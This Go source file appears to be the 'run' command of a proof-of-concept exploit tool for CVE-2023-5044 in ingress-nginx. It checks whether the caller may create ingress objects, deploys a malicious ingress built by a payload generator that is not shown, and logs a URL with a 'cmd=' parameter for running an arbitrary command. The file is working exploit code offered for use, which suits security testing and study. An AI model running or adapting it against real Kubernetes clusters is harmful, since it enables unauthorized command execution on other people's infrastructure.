package cmd

import (
	"context"
	"fmt"
	"log/slog"
	"net/url"

	"github.com/4armed/cve-2023-5044/pkg/poc"
	"github.com/spf13/cobra"
	authorizationv1 "k8s.io/api/authorization/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

func RunCmd(o *Options) *cobra.Command {
	cmd := &cobra.Command{
		Use:          "run",
		Short:        "Deploy an ingress to exploit CVE-2023-5044",
		Long:         "Deploy an ingress to exploit CVE-2023-5044",
		SilenceUsage: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			return o.Run()
		},
	}

	cmd.Flags().StringVarP(&o.URL, "url", "u", "", "URL to exploit")

	return cmd

}

func (o *Options) Run() error {
	if o.ConfigFlags.Namespace == nil || *o.ConfigFlags.Namespace == "" {
		ns := "default"
		o.ConfigFlags.Namespace = &ns
	}

	config, err := o.ConfigFlags.ToRESTConfig()
	if err != nil {
		return err
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return err
	}

	// Check that we can create an ingress
	sar := &authorizationv1.SelfSubjectAccessReview{
		Spec: authorizationv1.SelfSubjectAccessReviewSpec{
			ResourceAttributes: &authorizationv1.ResourceAttributes{
				Namespace: *o.ConfigFlags.Namespace,
				Verb:      "create",
				Resource:  "ingress",
			},
		},
	}

	slog.Info("checking permissions")
	response, err := client.AuthorizationV1().SelfSubjectAccessReviews().Create(context.TODO(), sar, metav1.CreateOptions{})
	if err != nil {
		return err
	}

	if !response.Status.Allowed {
		return fmt.Errorf("you do not have permission to create an ingress object: %v", response.Status.Reason)
	}

	i := poc.Generate(*o.ConfigFlags.Namespace, o.IngressObjectNamePrefix, o.RedirectPath, o.CloseItOffPath, o.ExploitCommand)

	ingress, err := client.NetworkingV1().Ingresses(*o.ConfigFlags.Namespace).Create(context.TODO(), i, metav1.CreateOptions{})
	if err != nil {
		return err
	}

	slog.Info("created ingress object", "namespace", ingress.ObjectMeta.Namespace, "name", ingress.ObjectMeta.Name)

	if o.URL != "" {
		slog.Info(fmt.Sprintf("exploit at %s/%s?cmd=%s", o.URL, o.RedirectPath, url.QueryEscape(o.ExploitCommand)))
	} else {
		slog.Info(fmt.Sprintf("exploit at /%s?cmd=%s", o.RedirectPath, url.QueryEscape(o.ExploitCommand)))
	}

	return nil
}
